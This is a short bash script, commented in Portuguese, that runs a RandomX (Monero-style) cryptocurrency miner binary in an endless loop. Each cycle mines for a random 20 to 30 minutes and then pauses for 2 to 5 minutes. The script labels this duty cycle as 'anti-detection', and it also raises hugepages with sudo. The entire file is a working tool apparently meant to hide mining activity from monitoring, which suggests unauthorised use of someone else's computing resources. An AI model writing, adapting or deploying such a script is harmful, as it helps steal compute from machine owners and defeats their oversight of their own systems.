#!/bin/bash
# MINE.SH - duty-cycle anti-deteccao + Rx FAST
cd "$(dirname "$0")"
sudo sysctl -w vm.nr_hugepages=64 >/dev/null 2>&1
CYCLE=0
while true; do
    CYCLE=$((CYCLE+1))
    MINE=$((1200 + RANDOM % 600))   # 20-30 min minerando
    PAUSE=$((120 + RANDOM % 180))   # 2-5 min pausa
    echo "[$(date +%H:%M:%S)] ciclo $CYCLE minera ${MINE}s" >> mine.log
    timeout $MINE ./allinone_cs -algo rx/0 -core 2 -ram 6000 -pass x >> mine.log 2>&1
    echo "[$(date +%H:%M:%S)] ciclo fim, pausa ${PAUSE}s" >> mine.log
    sleep $PAUSE
done
